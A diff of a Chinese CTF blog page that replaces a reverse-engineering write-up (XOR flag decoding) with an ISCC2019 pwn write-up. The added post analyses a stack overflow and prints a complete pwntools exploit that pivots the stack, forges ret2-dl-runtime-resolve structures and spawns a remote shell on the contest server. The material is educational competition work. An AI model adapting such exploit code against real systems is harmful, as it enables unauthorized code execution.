@@ -15,17 +15,19 @@
 
 
 
-<meta name="description" content="听了大佬的话先来搭个blog，虽然啥也不会，但是可以对着教程慢慢搭，不管怎样能看见网页就行了先…… 题目来自于cgctf平台，之前一直没做出来，光是名字就让我望而却步……   ida启动！main函数伪代码如下： 123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const ch">
+<meta name="description" content="ret2-dl-runtime-resolve">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CGCTF-480小时精通c++">
-<meta property="og:url" content="http://yoursite.com/2018/09/21/480小时/index.html">
+<meta property="og:title" content="ISCC2019-pwn01">
+<meta property="og:url" content="http://yoursite.com/2019/05/19/ISCC2019-pwn01/index.html">
 <meta property="og:site_name" content="4eriri&#39;s blog">
-<meta property="og:description" content="听了大佬的话先来搭个blog，虽然啥也不会，但是可以对着教程慢慢搭，不管怎样能看见网页就行了先…… 题目来自于cgctf平台，之前一直没做出来，光是名字就让我望而却步……   ida启动！main函数伪代码如下： 123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const ch">
+<meta property="og:description" content="ret2-dl-runtime-resolve">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-03-05T15:35:53.219Z">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/006tNc79gy1g36zvw2go6j31iy07swgk.jpg">
+<meta property="og:updated_time" content="2019-05-19T14:35:23.517Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CGCTF-480小时精通c++">
-<meta name="twitter:description" content="听了大佬的话先来搭个blog，虽然啥也不会，但是可以对着教程慢慢搭，不管怎样能看见网页就行了先…… 题目来自于cgctf平台，之前一直没做出来，光是名字就让我望而却步……   ida启动！main函数伪代码如下： 123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const ch">
+<meta name="twitter:title" content="ISCC2019-pwn01">
+<meta name="twitter:description" content="ret2-dl-runtime-resolve">
+<meta name="twitter:image" content="http://ww3.sinaimg.cn/large/006tNc79gy1g36zvw2go6j31iy07swgk.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -57,7 +59,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>CGCTF-480小时精通c++ | 4eriri&#39;s blog</title>
+<title>ISCC2019-pwn01 | 4eriri&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -189,11 +191,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-480小时" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-ISCC2019-pwn01" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/09/21/480小时/" class="article-date">
-      <time datetime="2018-09-20T16:52:52.000Z" itemprop="datePublished">2018-09-21</time>
+      <a href="/2019/05/19/ISCC2019-pwn01/" class="article-date">
+      <time datetime="2019-05-19T14:13:04.000Z" itemprop="datePublished">2019-05-19</time>
 </a>
 
 
@@ -208,7 +210,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      CGCTF-480小时精通c++
+      ISCC2019-pwn01
     </h1>
   
 
@@ -225,21 +227,20 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>听了大佬的话先来搭个blog，虽然啥也不会，但是可以对着教程慢慢搭，不管怎样能看见网页就行了先……</p>
-<p>题目来自于cgctf平台，之前一直没做出来，光是名字就让我望而却步……</p>
-<p>  ida启动！main函数伪代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; // [rsp+Ch] [rbp-54h]</span><br><span class="line">  __int64 v5; // [rsp+10h] [rbp-50h]</span><br><span class="line">  __int64 v6; // [rsp+18h] [rbp-48h]</span><br><span class="line">  __int64 v7; // [rsp+20h] [rbp-40h]</span><br><span class="line">  __int64 v8; // [rsp+28h] [rbp-38h]</span><br><span class="line">  int v9; // [rsp+30h] [rbp-30h]</span><br><span class="line">  char v10; // [rsp+34h] [rbp-2Ch]</span><br><span class="line">  unsigned __int64 v11; // [rsp+58h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(0x28u);</span><br><span class="line">  v5 = 7652827924304847970LL;</span><br><span class="line">  v6 = 6588269719570178159LL;</span><br><span class="line">  v7 = 0615273543157435660505LL;</span><br><span class="line">  v8 = 4932672475662219355LL;</span><br><span class="line">  v9 = 2099869557;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;((__int64)&amp;std::cout, (__int64)&quot;The Encrypted Flag is: &quot;);</span><br><span class="line">  for ( i = 0; i &lt;= 35; ++i )</span><br><span class="line">    printf(&quot;%02x&quot;, *((unsigned __int8 *)&amp;v5 + i));</span><br><span class="line">  std::ostream::operator&lt;&lt;((__int64)&amp;std::cout, (__int64)std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>很容易发现输出了加密后的flag，也就是v5-v9中的值，按r键转换成字符型，得加密flag:bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q{_tDuw)}</p>
-<p>进入汇编界面发现输出”The Encrypted Flag is: “前被nop了一段，应该就是加密函数。</p>
-<p>左侧函数列表中有480个名为_X1C_CG_EncryptFunction的函数，实现output[i]^=string[i%len(string)]^i，区别就是这480个函数中的string是从“001001001”到“480480480”。所以可以知道flag经过了这480个函数的加密后，就变成了bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q{_tDuw)}。</p>
-<p>逆运算脚本如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">key=[]</span><br><span class="line">for i in range(1,481):</span><br><span class="line">	n=str(i)</span><br><span class="line">	key.append(n.zfill(3)*3)</span><br><span class="line">final=&quot;bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q&#123;_tDuw)&#125;&quot;</span><br><span class="line">flag=final</span><br><span class="line">for i in range(479,-1,-1):</span><br><span class="line">	a=key[i]</span><br><span class="line">	for j in range(35,-1,-1):</span><br><span class="line">			s=ord(flag[j])</span><br><span class="line">			s^=ord(a[j%9])^j</span><br><span class="line">			flag=flag.replace(flag[j],chr(s),1)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
-<p><del>于是得到了flag</del></p>
-<p>可能由于并不会替换字符串中特定下标处的值，所以并没有得到flag……向大佬求救尚未得到回复……</p>
-<h2 id="两小时后"><a href="#两小时后" class="headerlink" title="两小时后"></a><strong><em>两小时后</em></strong></h2><p>原因没错，通过百度了一会python中字符串替换的问题，找到了正确的替换方式：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">key=[]</span><br><span class="line">for i in range(1,481):</span><br><span class="line">	n=str(i)</span><br><span class="line">	key.append(n.zfill(3)*3)</span><br><span class="line">final=&quot;bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q&#123;_tDuw)&#125;&quot;</span><br><span class="line">flag=final</span><br><span class="line">flag1=list(flag)</span><br><span class="line">for i in range(479,-1,-1):</span><br><span class="line">	a=key[i]</span><br><span class="line">	for j in range(36):</span><br><span class="line">			s=ord(flag1[j])</span><br><span class="line">			s^=ord(a[j%9])^j</span><br><span class="line">			flag1[j]=chr(s)</span><br><span class="line">flag=&apos;&apos;.join(flag1)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
-<p><strong>flag get！</strong></p>
-<p>通过大佬的指点终于是完成了这一道简单题，明明知道了怎么去逆运算，结果因为python不会用的原因忙了这么久……要学的太多</p>
+        <p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop/#ret2_dl_runtime_resolve" target="_blank" rel="noopener">ret2-dl-runtime-resolve</a></p>
+<a id="more"></a>
+<h1 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char dest; // [esp+0h] [ebp-16h]</span><br><span class="line">  size_t n; // [esp+Ah] [ebp-Ch]</span><br><span class="line">  int *v6; // [esp+Eh] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = &amp;argc;</span><br><span class="line">  n = read(0, &amp;buf, 0xF4240u);</span><br><span class="line">  memcpy(&amp;dest, &amp;buf, n);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>是很标准的ret2-dl-runtime-resolve例题了，需要注意的是需要看汇编：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:080484AE                 lea     esp, [ebp-8]</span><br><span class="line">.text:080484B1                 pop     ecx</span><br><span class="line">.text:080484B2                 pop     ebx</span><br><span class="line">.text:080484B3                 pop     ebp</span><br><span class="line">.text:080484B4                 lea     esp, [ecx-4]</span><br><span class="line">.text:080484B7                 retn</span><br></pre></td></tr></table></figure>
+<p>函数结尾处的汇编是这样的，意味着不能简单地填充溢出，和之前那道DDCTF的pwn一样，需要在特定位置输入正确的值才可以。</p>
+<p>不过这一题不一样的是，我们可以直接控制ebp,esp到buf上，然后buf上的数据是受我们输入控制的，再配合一些gadgets就可以完成调用read函数并且换栈。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh.send(&apos;aabbbbccccdddd&apos;+p32(buf+30)+p32(0)+p32(buf+26)+p32(read_plt)+p32(ppp_ret)+p32(0)+p32(stage)+p32(100)+p32(pop_ret)+p32(stage)+p32(leave_ret))</span><br></pre></td></tr></table></figure>
+<p>像这样就可以把栈换到stage处，接下来就是标准的ret2-dl-runtime-resolve，详细地原理介绍看CTF-WIKI就可以了。</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># coding=UTF-8from pwn import *#sh=process(&quot;./pwn01.dms&quot;)sh=remote(&quot;39.100.87.24&quot;,8101)elf=ELF(&apos;./pwn01.dms&apos;)bss=elf.bss()read_plt=elf.plt[&apos;read&apos;]buf=bss+0x20stage=buf+0x282#stage=buf+28pop_ret=0x0804851bppp_ret=0x08048519leave_ret=0x080483c5#gdb.attach(sh)sh.send(&apos;aabbbbccccdddd&apos;+p32(buf+30)+p32(0)+p32(buf+26)+p32(read_plt)+p32(ppp_ret)+p32(0)+p32(stage)+p32(100)+p32(pop_ret)+p32(stage)+p32(leave_ret))#sh.send(&apos;aabbbbccccdddd&apos;+p32(buf+32)+p32(0)+p32(buf+28)+&apos;aa&apos;+payload2)plt0 = elf.get_section_by_name(&apos;.plt&apos;).header.sh_addrrel_plt = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addrdynsym = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addrdynstr = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addrindex_offset = stage + 28 - rel_pltread_got = elf.got[&apos;read&apos;]read_index = (elf.plt[&apos;read&apos;] - plt0) / 16 - 1read_index *= 8r_offset=0x0804a00cfake_sym_addr = stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10  st_name = fake_sym_addr + 0x10 - dynstrfake_write_sym = flat([st_name, 0, 0, 0x12])r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_write_reloc = flat([read_got, r_info])payload=&apos;aaaa&apos;+p32(plt0)+p32(index_offset)+&apos;aaaa&apos;+p32(stage+84)+&apos;aaaa&apos;+&apos;aaaa&apos;+fake_write_reloc+&apos;a&apos;*align+fake_write_sym+&apos;system\x00&apos;payload+=&apos;a&apos;*(84-len(payload))payload+=&apos;sh\x00&apos;sh.send(payload)#sh.send(payload2)sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>基本照抄CTF-WIKI，有的偏移和CTF-WIKI不一样，是因为换栈的方式不一样，我的EXP在第二次使用read函数时，开头四个字符需要输入一个填充，来让<code>leave,ret</code>中<code>pop,ebp</code>时pop，这样后面所有的伪造的结构的地址都要+4。</p>
+<p>这题写了很久很久……主要是因为卡在了换栈的位置选择，我之前一直选择bss+400的位置，结果在调用dl_fixup时一直会报错，以为是换栈之类的出了问题，试了很久都不知道为啥，最终要感谢看雪论坛师傅mengllong的评论解救了我：</p>
+<p><img src="http://ww3.sinaimg.cn/large/006tNc79gy1g36zvw2go6j31iy07swgk.jpg" alt=""></p>
+<p>最后尝试了一下，至少要在bss+0x2a2的位置才不会出错2333</p>
 
       
     </div>
@@ -248,13 +249,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/09/21/480小时/">CGCTF-480小时精通c++</a></p>
+        <p><span>本文标题:</span><a href="/2019/05/19/ISCC2019-pwn01/">ISCC2019-pwn01</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
-        <p><span>发布时间:</span>2018-09-21, 00:52:52</p>
-        <p><span>最后更新:</span>2019-03-05, 23:35:53</p>
+        <p><span>发布时间:</span>2019-05-19, 22:13:04</p>
+        <p><span>最后更新:</span>2019-05-19, 22:35:23</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/09/21/480小时/" title="CGCTF-480小时精通c++">http://yoursite.com/2018/09/21/480小时/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/09/21/480小时/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/05/19/ISCC2019-pwn01/" title="ISCC2019-pwn01">http://yoursite.com/2019/05/19/ISCC2019-pwn01/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/05/19/ISCC2019-pwn01/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -267,11 +268,17 @@
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/09/22/base64/">
-                    base64
+                <a href="/2019/05/21/XCTF攻防世界REVERSE/">
+                    XCTF攻防世界REVERSE
                 </a>
             </div>
         
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/05/16/DDCTF2019-pwn/">
+                    DDCTF2019-pwn
+                </a>
+            </div>
         
     </nav>
 
@@ -281,7 +288,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#两小时后"><span class="toc-number">1.</span> <span class="toc-text">两小时后</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简单分析"><span class="toc-number">1.</span> <span class="toc-text">简单分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-number">2.</span> <span class="toc-text">EXP</span></a></li></ol>
         
     </div>
     <style>
@@ -317,7 +324,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"CGCTF-480小时精通c++　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"ISCC2019-pwn01　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -336,8 +343,8 @@
     <div id="disqus_thread"></div>
     <script>
         var disqus_config = function(){
-            this.page.url = 'http://yoursite.com/2018/09/21/480小时/';
-            this.page.identifier = '2018/09/21/480小时/';
+            this.page.url = 'http://yoursite.com/2019/05/19/ISCC2019-pwn01/';
+            this.page.identifier = '2019/05/19/ISCC2019-pwn01/';
         };
         var loadComment = function(){
             var d = document, s = d.createElement('script');
@@ -359,7 +366,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/09/22/base64/" title="上一篇: base64">
+            <a href="/2019/05/21/XCTF攻防世界REVERSE/" title="上一篇: XCTF攻防世界REVERSE">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -367,7 +374,9 @@
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+            <a href="/2019/05/16/DDCTF2019-pwn/" title="下一篇: DDCTF2019-pwn">
+                <i class="fa fa-angle-right"></i>
+            </a>
         
     </div>
 
